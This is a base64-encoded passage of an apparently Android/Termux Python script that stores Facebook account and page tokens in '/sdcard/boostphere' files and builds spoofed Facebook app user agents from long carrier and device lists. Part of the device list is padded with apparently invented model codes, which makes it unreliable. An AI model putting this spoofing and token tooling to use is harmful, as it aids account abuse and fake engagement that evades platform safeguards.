AgICBcMDMzWzMzbVBBVEg6ICIpLnN0cmlwKCkKCiAgICB0b2tlbl9vdXRwdXRfcGF0aCA9IGFjY291bnRfZmlsZQoKICAgIHByb3ooZmlsZV9wYXRoLCB0b2tlbl9vdXRwdXRfcGF0aCwgZXh0cmFjdF90eXBlKQoKCgoKICAgIApmb2xkZXJfbmFtZSA9ICIvc2RjYXJkL2Jvb3N0cGhlcmUiCmZpbGVfbmFtZXMgPSBbIkZSQUFDQ09VTlQudHh0IiwgIkZSQVBBR0VTLnR4dCIsICJSUFdBQ0NPVU5ULnR4dCIsICJSUFdQQUdFUy50eHQiLCJnZW5lcmF0ZWRfY29kZS50eHQiXQoKCgppZiBub3Qgb3MucGF0aC5leGlzdHMoZm9sZGVyX25hbWUpOgoKCiAgICB0cnk6CiAgICAgICAgICBvcy5tYWtlZGlycyhmb2xkZXJfbmFtZSkKICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgICAgICAgcGFzcwogICAgICAgICAgICAgIAoKCiAgICBmb3IgZmlsZV9uYW1lIGluIGZpbGVfbmFtZXM6CiAgICAgICAgZmlsZV9wYXRoID0gb3MucGF0aC5qb2luKGZvbGRlcl9uYW1lLCBmaWxlX25hbWUpCgogICAgICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cyhmaWxlX3BhdGgpOgoKICAgICAgICAgICAgdHJ5OgoKICAgICAgICAgICAgICAgIHdpdGggb3BlbihmaWxlX3BhdGgsICd3JykgYXMgZmlsZToKCiAgICAgICAgICAgICAgICAgICAgcGFzcyAgCiAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb246CgogICAgICAgICAgICAgICAgcGFzcyAgCgoKZGVmIGNvdW50X3Rva2VucyhhY2NvdW50c19maWxlLCBwYWdlc19maWxlKToKICAgICIiIkNvdW50IHRoZSBudW1iZXIgb2YgYWNjb3VudHMgYW5kIHBhZ2VzIHN0b3JlZCBpbiB0aGUgcmVzcGVjdGl2ZSBmaWxlcy4iIiIKICAgIHRvdGFsX2FjY291bnRzID0gMAogICAgdG90YWxfcGFnZXMgPSAwCgogICAgdHJ5OgogICAgICAgIHdpdGggb3BlbihhY2NvdW50c19maWxlLCAncicpIGFzIGFmOgogICAgICAgICAgICB0b3RhbF9hY2NvdW50cyA9IHN1bSgxIGZvciBsaW5lIGluIGFmIGlmIGxpbmUuc3RyaXAoKSkgICMgQ291bnQgbm9uLWVtcHR5IGxpbmVzCiAgICBleGNlcHQgRmlsZU5vdEZvdW5kRXJyb3I6CiAgICAgICAgcHJpbnQoZiJBY2NvdW50IGZpbGUgbm90IGZvdW5kOiB7YWNjb3VudHNfZmlsZX0iKQoKICAgIHRyeToKICAgICAgICB3aXRoIG9wZW4ocGFnZXNfZmlsZSwgJ3InKSBhcyBwZjoKICAgICAgICAgICAgdG90YWxfcGFnZXMgPSBzdW0oMSBmb3IgbGluZSBpbiBwZiBpZiBsaW5lLnN0cmlwKCkpICAjIENvdW50IG5vbi1lbXB0eSBsaW5lcwogICAgZXhjZXB0IEZpbGVOb3RGb3VuZEVycm9yOgogICAgICAgIHByaW50KGYiUGFnZSBmaWxlIG5vdCBmb3VuZDoge3BhZ2VzX2ZpbGV9IikKCiAgICByZXR1cm4gdG90YWxfYWNjb3VudHMsIHRvdGFsX3BhZ2VzCmltcG9ydCBvcwppbXBvcnQgcmVxdWVzdHMKaW1wb3J0IHJhbmRvbQppbXBvcnQgc3RyaW5nCmltcG9ydCB1dWlkCmltcG9ydCByYW5kb20KZGVmIHVzZXJfYWdpbnQoKToKICAgCgogICAgCiAgICBmYmNyX3ZhbHVlcyA9IFsKICAgICAgICAiQVQmVCIsICJPcmFuZ2UgRnJhbmNlIiwgIlRlbGlhIFN3ZWRlbiIsIlZvZGFmb25lIEl0YWx5IiwgIlNreSBNb2JpbGUiLCJQcm94aW11cyBCZWxnaXVtIiwgIk1vdmlzdGFyIFNwYWluIiwgIlRlbGUyIE5ldGhlcmxhbmRzIiwgIlZvZGFmb25lIFNwYWluIiwgIlRlbGVrb20gRGV1dHNjaGxhbmQiLCJFaXIgSXJlbGFuZCIsICJLUE4gTmV0aGVybGFuZHMiLCAiVGhyZWUgSXJlbGFuZCIsICJUZWxla29tIEF1c3RyaWEiLCAiVGVsaWEgU3dlZGVuIiwiVm9kYWZvbmUgSXRhbHkiLCAiU2t5IE1vYmlsZSIsICJQcm94aW11cyBCZWxnaXVtIiwgIk1vdmlzdGFyIFNwYWluIiwgIlRlbGUyIE5ldGhlcmxhbmRzIiwiVm9kYWZvbmUgU3BhaW4iLCAiVGVsZWtvbSBEZXV0c2NobGFuZCIsICJFaXIgSXJlbGFuZCIsICJLUE4gTmV0aGVybGFuZHMiLCAiVGhyZWUgSXJlbGFuZCIsIlRlbGVrb20gQXVzdHJpYSIsICJUZWxpYSBTd2VkZW4iLCAiVm9kYWZvbmUgSXRhbHkiLCAiU2t5IE1vYmlsZSIsICJQcm94aW11cyBCZWxnaXVtIiwiTW92aXN0YXIgU3BhaW4iLCAiVGVsZTIgTmV0aGVybGFuZHMiLCJWb2RhZm9uZSBTcGFpbiIsICJUZWxla29tIERldXRzY2hsYW5kIiwgIkVpciBJcmVsYW5kIiwiS1BOIE5ldGhlcmxhbmRzIiwgIlRocmVlIElyZWxhbmQiLCAiVGVsZWtvbSBBdXN0cmlhIiwgIkNoaW5hIE1vYmlsZSIsICJOVFQgRG9jb21vIiwgIktUIENvcnBvcmF0aW9uIiwgIlNpbmd0ZWwiLCJBSVMgVGhhaWxhbmQiLCAiVmlldHRlbCIsICJTbWFydCBDb21tdW5pY2F0aW9ucyIsICJQVENMIFBha2lzdGFuIiwgIkdyYW1lZW5waG9uZSBCYW5nbGFkZXNoIiwiTmVwYWwgVGVsZWNvbSIsICJNVE4gTmlnZXJpYSIsICJULU1vYmlsZSBVU0EiLCAiVmVyaXpvbiBXaXJlbGVzcyIsICJSb2dlcnMgQ2FuYWRhIiwiTzIgVW5pdGVkIEtpbmdkb20iLCAiVGVsc3RyYSBBdXN0cmFsaWEiLCAiVElNIEJyYXppbCIsICJWaXZvIEluZGlhIiwgIlRlbGVub3IgTm9yd2F5IiwiTW9iaWxpbmsgUGFraXN0YW4iLCAiQmVsbCBDYW5hZGEiLCAiRXRpc2FsYXQgVUFFIiwgIkNsYXJvIE1leGljbyIsICJPcmFuZ2UgU3BhaW4iLCJWb2RhZm9uZSBQb3J0dWdhbCIsICJUZWxrb21zZWwgSW5kb25lc2lhIiwiQmVlbGluZSBSdXNzaWEiLCAiTVRTIFJ1c3NpYSIsICJPcHR1cyBBdXN0cmFsaWEiLCJTSyBUZWxlY29tIFNvdXRoIEtvcmVhIiwgIkVudGVsIENoaWxlIiwgIk1UTkwgSW5kaWEiLCAiVGlnbyBHaGFuYSIsICJJZGVhIEluZGlhIiwiRFRBQyBUaGFpbGFuZCIsICJab25nIFBha2lzdGFuIiwgIk9yYW5nZSBSb21hbmlhIiwgIkVFIFVuaXRlZCBLaW5nZG9tIiwgIkRpZ2kgTWFsYXlzaWEiLCJLb29kbyBDYW5hZGEiLCAiWW9pZ28gU3BhaW4iLCAiQWlydGVsIE5pZ2VyaWEiLCAiQWlydGVsIEtlbnlhIiwgIlRlbGVrb20gTWFsYXlzaWEiLCJDb3Ntb3RlIEdyZWVjZSIsICJEaWdpY2VsIEphbWFpY2EiLCAiTElNRSBDYXJpYmJlYW4iLCAiVGVsdXMgQ2FuYWRhIiwgIlNwcmludCBVU0EiLCJNb3Zpc3RhciBNZXhpY28iLCAiVm9kYWZvbmUgR2VybWFueSIsICJPcHR1cyBBdXN0cmFsaWEiLCJWaXZvIEJyYXppbCIsICJTaW5ndGVsIFNpbmdhcG9yZSIsICJBaXJ0ZWwgSW5kaWEiLCAiTmNlbGwgTmVwYWwiLCAiVGVsZW5vciBTd2VkZW4iLCJNRU8gUG9ydHVnYWwiLCAiQ2xhcm8gQXJnZW50aW5hIiwgIkVFIEVzdG9uaWEiLCAiVGVsa29tIFNvdXRoIEFmcmljYSIsICJUZWxlbm9yIE5vcndheSIsIllvaWdvIFNwYWluIiwgIkdpZmZnYWZmIFVuaXRlZCBLaW5nZG9tIiwgIkx5Y2Ftb2JpbGUgRnJhbmNlIiwgIkExIFRlbGVrb20gQXVzdHJpYSIsICJUZWxlbm9yIEh1bmdhcnkiLCJWb2RhZm9uZSBHcmVlY2UiLCAiQ29zbW90ZSBSb21hbmlhIiwgIlRlbGVub3IgU2VyYmlhIiwgIlZvZGFmb25lIE5ldyBaZWFsYW5kIiwgIlRlbGVrb20gQ3JvYXRpYSIsIk9yYW5nZSBCZWxnaXVtIiwgIlRlbGtvbXNlbCBJbmRvbmVzaWEiLCAiVml2YWNvbSBCdWxnYXJpYSIsICJPcmFuZ2UgUG9sYW5kIiwgIlJvZ2VycyBDYW5hZGEiLCJUZWxrb20gU291dGggQWZyaWNhIiwgIkx5Y2Ftb2JpbGUgR2VybWFueSIsICJNMSBTaW5nYXBvcmUiLCAiRFQgTW9iaWxlIEF1c3RyaWEiLCAiQ2xhcm8gQ29sb21iaWEiLCJUZWxrb21zZWwgSW5kb25lc2lhIiwgIlRlbGUyIE5vcndheSIsICJUZWxpYSBFc3RvbmlhIiwgIlRlbGVub3IgRGVubWFyayIsIlJha3V0ZW4gTW9iaWxlIEphcGFuIiwiT29yZWRvbyBRYXRhciIsIk1vdmlzdGFyIEFyZ2VudGluYSIsICJULU1vYmlsZSBOZXRoZXJsYW5kcyIsICJUZWxla29tIEh1bmdhcnkiLCAiVm9kYWZvbmUgUm9tYW5pYSIsIk5PUyBQb3J0dWdhbCIsICJEaWdpY2VsIEhhaXRpIiwgIlRocmVlIEhvbmcgS29uZyIsICJBaXJ0ZWwgQmFuZ2xhZGVzaCIsICJUZWxjZWwgTWV4aWNvIiwiT3JhbmdlIE1vbGRvdmEiLCAiVGVsa29tc2VsIEluZG9uZXNpYSIsICJUZWxlbm9yIEJ1bGdhcmlhIiwiVm9kYWZvbmUgVWtyYWluZSIsICJDb3Ntb3RlIEdyZWVjZSIsIlQtTW9iaWxlIEN6ZWNoIFJlcHVibGljIiwgIk5ldE9uZSBaaW1iYWJ3ZSIsICJHbG8gTmlnZXJpYSIsICJNVFMgQmVsYXJ1cyIsICJDZWxsIEMgU291dGggQWZyaWNhIiwiTWF4aXMgTWFsYXlzaWEiLCAiRmlkbyBDYW5hZGEiLCAiWmFpbiBTYXVkaSBBcmFiaWEiLCAiVGVsZW5vciBTZXJiaWEiLCAiQmVlbGluZSBVemJla2lzdGFuIiwiQTEgVGVsZWtvbSBBdXN0cmlhIiwgIlpvbmcgUGFraXN0YW4iLCAiSmF6eiBQYWtpc3RhbiIsICJWb2RhZm9uZSBQb3J0dWdhbCIsICJUZWxzdHJhIEF1c3RyYWxpYSIsIlZvZGFmb25lIElyZWxhbmQiLCAiT3JhbmdlIFNsb3Zha2lhIiwgIkNsYXJvIFBlcnUiLCAiVml2byBCcmF6aWwiLCAiVm9kYWZvbmUgQ3plY2ggUmVwdWJsaWMiLCJUZWxlbm9yIE1vbnRlbmVncm8iLCAiRGlnaSBNYWxheXNpYSIsICJFdGlzYWxhdCBFZ3lwdCIsICJUaWdvIFJ3YW5kYSIsICJSb2JpIEJhbmdsYWRlc2giLCJNVEMgTmFtaWJpYSIsICJBSVMgVGhhaWxhbmQiLCAiVm9kYWZvbmUgR3JlZWNlIiwgIk9yYW5nZSBSb21hbmlhIiwgIlQtTW9iaWxlIFBvbGFuZCIsIlRlbGVub3IgSHVuZ2FyeSIsICJUZWxpYSBMYXR2aWEiLCAiT29yZWRvbyBPbWFuIiwgIk9wdHVzIEF1c3RyYWxpYSIsICJPcmFuZ2UgQmVsZ2l1bSIsIlRlbGVub3IgTm9yd2F5IiwgIkx5Y2Ftb2JpbGUgRnJhbmNlIiwgIkVFIEVzdG9uaWEiLCAiWW9pZ28gU3BhaW4iLCAiR2lmZmdhZmYgVW5pdGVkIEtpbmdkb20iLCJTcHJpbnQgVVNBIiwgIlRlbHVzIENhbmFkYSIsICJWb2RhZm9uZSBHZXJtYW55IiwgIk1vdmlzdGFyIE1leGljbyIsICJUZWxrb21zZWwgSW5kb25lc2lhIiwiVml2byBJbmRpYSIsICJBaXJ0ZWwgSW5kaWEiLCAiTmNlbGwgTmVwYWwiLCAiVGVsZW5vciBTd2VkZW4iLCAiTUVPIFBvcnR1Z2FsIiwiQ2xhcm8gQXJnZW50aW5hIiwgIlRlbGVrb20gQ3JvYXRpYSIsICJDb3Ntb3RlIFJvbWFuaWEiLCAiT3JhbmdlIFBvbGFuZCIsICJUZWxlbm9yIFNlcmJpYSIsIlZvZGFmb25lIE5ldyBaZWFsYW5kIiwgIlZpdmFjb20gQnVsZ2FyaWEiLCAiVGVsZW5vciBEZW5tYXJrIiwgIlQtTW9iaWxlIE5ldGhlcmxhbmRzIiwgIk5PUyBQb3J0dWdhbCIsIlRlbGtvbXNlbCBJbmRvbmVzaWEiLCAiVGVsZTIgTm9yd2F5IiwgIlRlbGlhIEVzdG9uaWEiLCAiVGVsZW5vciBEZW5tYXJrIiwgIlJha3V0ZW4gTW9iaWxlIEphcGFuIiwiT29yZWRvbyBRYXRhciIsICJNb3Zpc3RhciBBcmdlbnRpbmEiLCAiVC1Nb2JpbGUgTmV0aGVybGFuZHMiLCAiVGVsZWtvbSBIdW5nYXJ5IiwgIlZvZGFmb25lIFJvbWFuaWEiLCJEaWdpY2VsIEhhaXRpIiwgIlRocmVlIEhvbmcgS29uZyIsICJBaXJ0ZWwgQmFuZ2xhZGVzaCIsICJUZWxjZWwgTWV4aWNvIiwgIk9yYW5nZSBNb2xkb3ZhIiwiVGVsa29tc2VsIEluZG9uZXNpYSIsICJPMiBHZXJtYW55IiwgIkFpcnRlbCBOaWdlcmlhIiwgIk9yYW5nZSBLZW55YSIsIkRpZ2ljZWwgSmFtYWljYSIsIlVuaXRlbCBBbmdvbGEiLCAiTW9iaUZvbmUgVmlldG5hbSIsICJUTU4gUG9ydHVnYWwiLCAiR3JhbWVlbnBob25lIEJhbmdsYWRlc2giLCAiTW92aXRlbCBNb3phbWJpcXVlIiwiVGVsa29tIFNvdXRoIEFmcmljYSIsICJHbG9iYWNvbSBOaWdlcmlhIiwgIk5hd3JhcyBPbWFuIiwgIlZvZGFmb25lIEdoYW5hIiwgIlRlbGVub3IgUGFraXN0YW4iLCJZb2lnbyBTcGFpbiIsICJTRlIgRnJhbmNlIiwgIlRpZ28gQ29sb21iaWEiLCAiVm9kYWZvbmUgUWF0YXIiLCAiRXRpc2FsYXQgVUFFIiwiVGVsZW5vciBOb3J3YXkiLCAiVGVsaWEgRmlubGFuZCIsICJMSU1FIENhcmliYmVhbiIsICJFRSBVbml0ZWQgS2luZ2RvbSIsICJLb29kbyBDYW5hZGEiLCJUSU0gSXRhbHkiLCAiVGVsZWtvbSBSb21hbmlhIiwgIkppbyBJbmRpYSIsICJPb3JlZG9vIEt1d2FpdCIsICJPcmFuZ2UgU3dpdHplcmxhbmQiLCJCb3V5Z3VlcyBUZWxlY29tIEZyYW5jZSIsICJFbnRlbCBCb2xpdmlhIiwgIkExIFRlbGVrb20gQXVzdHJpYSIsICJNVE4gU291dGggQWZyaWNhIiwgIlZvZGFmb25lIEh1bmdhcnkiLCJaYWluIEpvcmRhbiIsICJOY2VsbCBOZXBhbCIsICJaYWluIEt1d2FpdCIsICJEamV6enkgQWxnZXJpYSIsICJTbWFydCBQaGlsaXBwaW5lcyIsIlRlbGVub3IgQnVsZ2FyaWEiLCAiQ29zbW90ZSBHcmVlY2UiLCAiVm9kYWZvbmUgUG9ydHVnYWwiLCAiVGVsc3RyYSBBdXN0cmFsaWEiLCAiVGhyZWUgSXJlbGFuZCIsIlJvZ2VycyBDYW5hZGEiLCAiU2FmYXJpY29tIEtlbnlhIiwgIk9yYW5nZSBMdXhlbWJvdXJnIiwgIkVsaXNhIEZpbmxhbmQiLCAiVm9kYWZvbmUgTmV0aGVybGFuZHMiLCJLUE4gTmV0aGVybGFuZHMiLCAiVGVsaWEgTGl0aHVhbmlhIiwgIlZvZGFmb25lIEljZWxhbmQiLCAiVGlnbyBHaGFuYSIsICJJZGVhIEluZGlhIiwiVGF0YSBEb2NvbW8gSW5kaWEiLCAiQWlyY2VsIEluZGlhIiwgIkNsYXJvIENoaWxlIiwgIk1vdmlzdGFyIFBlcnUiLCAiVC1Nb2JpbGUgQ3JvYXRpYSIsIlRlbGtvbXNlbCBJbmRvbmVzaWEiLCAiTzIgQ3plY2ggUmVwdWJsaWMiLCAiU21hcnRmcmVuIEluZG9uZXNpYSIsICJBeGlhdGEgTWFsYXlzaWEiLCAiRGlnaWNlbCBDYXJpYmJlYW4iLCJCZWVsaW5lIEthemFraHN0YW4iLCAiTW9sZGNlbGwgTW9sZG92YSIsICJEamV6enkgQWxnZXJpYSIsICJUaWdvIFJ3YW5kYSIsICJWb2RhZm9uZSBFZ3lwdCIsIkNPU01PVEUgQ3lwcnVzIiwgIkJlbGwgTW9iaWxpdHkgQ2FuYWRhIiwgIlRlbGVub3IgU3dlZGVuIiwgIjMgU3dlZGVuIiwgIkROQSBGaW5sYW5kIiwiWmFpbiBCYWhyYWluIiwgIk9vcmVkb28gVHVuaXNpYSIsICJPcmFuZ2UgTW9yb2NjbyIsICJWaXZhY29tIEJ1bGdhcmlhIiwgIlZJUG5ldCBDcm9hdGlhIiwiVm9kYWZvbmUgR3JlZWNlIiwgIk9yYW5nZSBSb21hbmlhIiwgIlQtTW9iaWxlIFBvbGFuZCIsICJUZWxlbm9yIEh1bmdhcnkiLCAiQUlTIFRoYWlsYW5kIiwiVHJ1ZU1vdmUgVGhhaWxhbmQiLCAiVm9kYWZvbmUgQ3plY2ggUmVwdWJsaWMiLCAiRGlnaSBNYWxheXNpYSIsICJYTCBBeGlhdGEgSW5kb25lc2lhIiwgIkRpYWxvZyBTcmkgTGFua2EiLCJNVE4gVWdhbmRhIiwgIkFpcnRlbCBCYW5nbGFkZXNoIiwgIlZpdmEgS3V3YWl0IiwgIldpbmQgSXRhbHkiLCAiTE1UIExhdHZpYSIsIllvaWdvIFNwYWluIiwgIk1hcm9jIFRlbGVjb20gTW9yb2NjbyIsICJPcmFuZ2UgSXZvcnkgQ29hc3QiLCAiQWlydGVsIE1hbGF3aSIsICJBaXJ0ZWwgWmFtYmlhIiwgIkRJVE8iLCAiR2xvYmUiLCAiR09NTyIsICJUTlQiLCAiVE0iXQogICAKCiAgICBmYm1mX2ZiZHZfZGljdCA9IHsKCiAgICAiYXN1cyI6IFsiWmVuRm9uZSA4IiwgIlJPRyBQaG9uZSA1IiwgIlplbkZvbmUgNyIsICJST0cgUGhvbmUgMyIsICJaZW5Gb25lIDYiLCAiUk9HIFBob25lIElJIiwgIlplbkZvbmUgNVoiLCAiWmVuRm9uZSA1IiwgIlplbkZvbmUgNCBQcm8iLCAiWmVuRm9uZSA0IiwgIlplbkZvbmUgMyBEZWx1eGUiLCAiWmVuRm9uZSAzIiwgIlplbkZvbmUgMiBMYXNlciIsICJaZW5Gb25lIDIiLCAiWmVuRm9uZSIsICJaZW5Gb25lIDZaIiwgIlplbkZvbmUgTWF4IFBybyAoTTIpIiwgIlplbkZvbmUgTWF4IFBybyAoTTEpIiwgIlplbkZvbmUgNloiLCAiWmVuRm9uZSBNYXggUGx1cyAoTTIpIiwgIlplbkZvbmUgTWF4IChNMikiLCAiWmVuRm9uZSBNYXggKE0xKSIsICJaZW5Gb25lIExpdmUiLCAiWmVuRm9uZSBab29tIiwgIlplbkZvbmUgU2VsZmllIiwgIkFTVVNfWjAxUkQiLCAiQVNVU19aMDFRRCIsICJBU1VTX0kwMVdEIiwgIkFTVVNfSTAxQkQiLCAiQVNVU19JMDFIREEiXSwKICAgIAogICAgImxlbm92byI6IFsiTGVnaW9uIFBob25lIER1ZWwgMiIsICJMZWdpb24gUGhvbmUgRHVlbCIsICJLMTIgTm90ZSIsICJLMTAgTm90ZSIsICJaNiBQcm8iLCAiWjUgUHJvIiwgIkxlbm92byBaNiBQcm8iLCAiTGVub3ZvIFo2IFlvdXRoIiwgIkxlbm92byBaNXMiLCAiTGVub3ZvIFo1IFBybyBHVCIsICJMZW5vdm8gWjUgUHJvIiwgIkxlbm92byBaNSIsICJMZW5vdm8gSzkiLCAiTGVub3ZvIEE1IiwgIkxlbm92byBLMzIwdCIsICJMZW5vdm8gSzggTm90ZSIsICJMZW5vdm8gSzYgTm90ZSIsICJMZW5vdm8gVmliZSBLNSBOb3RlIiwgIkxlbm92byBWaWJlIEs1IiwgIkxlbm92byBWaWJlIFAxIiwgIkxlbm92byBWaWJlIFgzIiwgIkxlbm92byBWaWJlIFoyIFBybyIsICJMZW5vdm8gVmliZSBaMiIsICJMZW5vdm8gVmliZSBaIiwiQTYwMDAiLCAiQTYwMDAgUGx1cyIsICJBNzAwMCIsICJBNzAwMCBUdXJibyIsICJBMjAxMCIsICJBMjAxMC1hIiwgIkszIE5vdGUiLCAiVmliZSBLNCBOb3RlIiwgIlZpYmUgSzUgTm90ZSIsICJWaWJlIEs1IFBsdXMiLCAiVmliZSBLNSIsICJWaWJlIEs1IExpdGUiLCAiVmliZSBLNSBQb3dlciIsICJWaWJlIEs1IFMiLCAiVmliZSBYMiIsICJWaWJlIFgzIiwgIlZpYmUgWjIgUHJvIiwgIks2IFBvd2VyIiwgIks2IE5vdGUiLCAiSzYiLCAiSzYgUGx1cyIsICJLNiBUdXJibyIsICJWaWJlIEMiLCAiVmliZSBDMiIsICJWaWJlIEMyIFBvd2VyIiwgIlZpYmUgQzIgSzEwYTQwIiwgIlZpYmUgQzIgSzEwYTQwQyIsICJWaWJlIEIiLCAiVmliZSBCIEEyMDE2YTQwIiwgIlZpYmUgQiBBMjAxNmIzMCIsICJWaWJlIEIgQTIwMTZiMzEiLCAiVmliZSBCIEEyMDE2YjMxQyIsICJWaWJlIEIgQTIwMTZiMzBBIiwgIlZpYmUgQiBBMjAxNmIzMEIiLCAiVmliZSBCIEEyMDE2YjMwQyIsICJWaWJlIEIgQTIwMTZiMzBEIiwgIlZpYmUgQiBBMjAxNmIzMEUiLCAiVmliZSBCIEEyMDE2YjMwRyIsICJWaWJlIEIgQTIwMTZiMzBKIiwgIlZpYmUgQiBBMjAxNmIzMEsiLCAiVmliZSBCIEEyMDE2YjMwTCIsICJWaWJlIEIgQTIwMTZiMzBNIiwgIlZpYmUgQiBBMjAxNmIzME4iLCAiVmliZSBCIEEyMDE2YjMwTyIsICJWaWJlIEIgQTIwMTZiMzBRIiwgIlZpYmUgQiBBMjAxNmIzMFIiLCAiVmliZSBCIEEyMDE2YjMwVCIsICJWaWJlIEIgQTIwMTZiMzBXIiwgIlZpYmUgQiBBMjAxNmIzMFkiLCAiVmliZSBCIEEyMDE2YjMxQSIsICJWaWJlIEIgQTIwMTZiMzFCIiwgIlZpYmUgQiBBMjAxNmIzMUMiLCAiVmliZSBCIEEyMDE2YjMxRSIsICJWaWJlIEIgQTIwMTZiMzFGIiwgIlZpYmUgQiBBMjAxNmIzMUciLCAiVmliZSBCIEEyMDE2YjMxSCIsICJWaWJlIEIgQTIwMTZiMzFLIiwgIlZpYmUgQiBBMjAxNmIzMUwiLCAiVmliZSBCIEEyMDE2YjMxTSIsICJWaWJlIEIgQTIwMTZiMzFOIiwgIlZpYmUgQiBBMjAxNmIzMU8iLCAiVmliZSBCIEEyMDE2YjMxUCIsICJWaWJlIEIgQTIwMTZiMzFRIiwgIlZpYmUgQiBBMjAxNmIzMVIiLCAiVmliZSBCIEEyMDE2YjMxUyIsICJWaWJlIEIgQTIwMTZiMzFUIiwgIlZpYmUgQiBBMjAxNmIzMVUiLCAiVmliZSBCIEEyMDE2YjMxViIsICJWaWJlIEIgQTIwMTZiMzFXIiwgIlZpYmUgQiBBMjAxNmIzMVgiLCAiVmliZSBCIEEyMDE2YjMxWSIsICJWaWJlIEIgQTIwMTZiMzFaIiwgIlZpYmUgQiBBMjAxNmIzMUFBIiwgIlZpYmUgQiBBMjAxNmIzMUFCIiwgIlZpYmUgQiBBMjAxNmIzMUFDIiwgIlZpYmUgQiBBMjAxNmIzMUFEIiwgIlZpYmUgQiBBMjAxNmIzMUFFIiwgIlZpYmUgQiBBMjAxNmIzMUFGIiwgIlZpYmUgQiBBMjAxNmIzMUFHIiwgIlZpYmUgQiBBMjAxNmIzMUFIIiwgIlZpYmUgQiBBMjAxNmIzMUFJIiwgIlZpYmUgQiBBMjAxNmIzMUFKIiwgIlZpYmUgQiBBMjAxNmIzMUFLIiwgIlZpYmUgQiBBMjAxNmIzMUFMIiwgIlZpYmUgQiBBMjAxNmIzMUFNIiwgIlZpYmUgQiBBMjAxNmIzMUFOIiwgIlZpYmUgQiBBMjAxNmIzMUFPIiwgIlZpYmUgQiBBMjAxNmIzMUFQIiwgIlZpYmUgQiBBMjAxNmIzMUFRIiwgIlZpYmUgQiBBMjAxNmIzMUFSIiwgIlZpYmUgQiBBMjAxNmIzMUFTIiwgIlZpYmUgQiBBMjAxNmIzMUFUIiwgIlZpYmUgQiBBMjAxNmIzMUFVIiwgIlZpYmUgQiBBMjAxNmIzMUFWIiwgIlZpYmUgQiBBMjAxNmIzMUFXIiwgIlZpYmUgQiBBMjAxNmIzMUFYIiwgIlZpYmUgQiBBMjAxNmIzMUFZIiwgIlZpYmUgQiBBMjAxNmIzMUFaIiwgIlZpYmUgQiBBMjAxNmIzMUJBIiwgIlZpYmUgQiBBMjAxNmIzMUJCIiwgIlZpYmUgQiBBMjAxNmIzMUJDIiwgIlZpYmUgQiBBMjAxNmIzMUJEIiwgIlZpYmUgQiBBMjAxNmIzMUJFIiwgIlZpYmUgQiBBMjAxNmIzMUJGIiwgIlZpYmUgQiBBMjAxNmIzMUJHIiwgIlZpYmUgQiBBMjAxNmIzMUJIIiwgIlZpYmUgQiBBMjAxNmIzMUJJIiwgIlZpYmUgQiBBMjAxNmIzMUJKIiwgIlZpYmUgQiBBMjAxNmIzMUJLIiwgIlZpYmUgQiBBMjAxNmIzMUJMIiwgIlZpYmUgQiBBMjAxNmIzMUJNIiwgIlZpYmUgQiBBMjAxNmIzMUJOIiwgIlZpYmUgQiBBMjAxNmIzMUJPIiwgIlZpYmUgQiBBMjAxNmIzMUJQIiwgIlZpYmUgQiBBMjAxNmIzMUJRIiwgIlZpYmUgQiBBMjAxNmIzMUJSIiwgIlZpYmUgQiBBMjAxNmIzMUJTIl0sCiAgICAKICAgICJzb255IjogWyJYcGVyaWEgNSBJSUkiLCAiWHBlcmlhIDEwIElJIiwgIlhwZXJpYSAxIElJIiwgIlhwZXJpYSAxMCBQbHVzIiwgIlhwZXJpYSAxIiwgIlhwZXJpYSBYWjMiLCAiWHBlcmlhIDEgSUlJIiwgIlhwZXJpYSAxIElJIiwgIlhwZXJpYSAxIiwgIlhwZXJpYSA1IElJSSIsICJYcGVyaWEgNSBJSSIsICJYcGVyaWEgNSIsICJYcGVyaWEgMTAgSUlJIiwgIlhwZXJpYSAxMCBJSSIsICJYcGVyaWEgMTAiLCAiWHBlcmlhIFBybyIsICJYcGVyaWEgTDQiLCAiWHBlcmlhIEwzIiwgIlhwZXJpYSBYWjMiLCAiWHBlcmlhIFhaMiBQcmVtaXVtIiwgIlhwZXJpYSBYWjIiLCAiWHBlcmlhIFhaMSBDb21wYWN0IiwgIlhwZXJpYSBYWjEiLCAiWHBlcmlhIFhaIFByZW1pdW0iLCAiWHBlcmlhIFhaIiwgIlhwZXJpYSBYQTIgVWx0cmEiLCAiWHBlcmlhIFhBMiIsICJYcGVyaWEgWEExIFVsdHJhIiwgIlhwZXJpYSBYQTEgUGx1cyIsICJYcGVyaWEgWEExIiwgIlhwZXJpYSBYIENvbXBhY3QiLCJDNjYwMyIsICJENjUwMyIsICJGNTEyMSIsICJGODMzMSIsICJHMzExNiIsICJIMzExMyIsICJKOTIxMCIsICJYUS1BUzUyIiwgIlhRLUFENTIiLCAiWFEtQlQ1MiIsICJYUS1CUzUyIiwgIlhRLUFUNTEiLCAiWFEtQVQ1MiIsICJYUS1BRDUyIiwgIlhRLUFUNTIiLCAiWFEtQVQ0MiIsICJYUS1BVDQxIiwgIlhRLUFENTEiLCAiWFEtQlQ1MSIsICJYUS1CUzQxIiwgIlhRLUJTNTIiLCAiWFEtQlQ1MiIsICJYUS1BRDUxIiwgIlhRLUJUNTEiLCAiWFEtQlM0MSIsICJYUS1BVDQxIiwgIlhRLUJTNTIiLCAiWFEtQlQ1MiIsICJYUS1BUzQyIiwgIlhRLUJTNDIiLCAiWFEtQVQ0MiIsICJYUS1CUzQxIiwgIlhRLUFUNTEiLCAiWFEtQUQ1MSIsICJYUS1BRDQyIiwgIlhRLUFTNDEiLCAiWFEtQlQ0MSIsICJYUS1CVDUxIiwgIlhRLUJTNTEiLCAiWFEtQlM0MiIsICJYUS1BUzUyIiwgIlhRLUFTNDEiLCAiWFEtQlM0MiIsICJYUS1CVDQxIiwgIlhRLUFTNDIiLCAiWFEtQVQ0MiIsICJYUS1BRDQyIiwgIlhRLUJTNDEiLCAiWFEtQVQ0MSIsICJYUS1CUzUxIiwgIlhRLUJUNTEiLCAiWFEtQVQ1MSIsICJYUS1BRDUxIiwgIkY4MTMxIiwgIkY4MTMyIiwgIkczMTIxIiwgIkczMTEyIiwgIkczMTIzIiwgIkczMTI1IiwgIkc4MTQxIiwgIkc4MTQyIiwgIkc4MzQxIiwgIkc4MzQyIiwgIkg4MjE2IiwgIkg4MjY2IiwgIkg4Mjk2IiwgIkg4NDE2IiwgIkg5NDM2IiwgIkg5NDYxIiwgIkg5NDM2IiwgIkg5NDYxIiwgIkg5NDM2IiwgIkg5NDkzIiwgIkg4NTQxIiwgIkg4NTI2IiwgIkg4MTE2IiwgI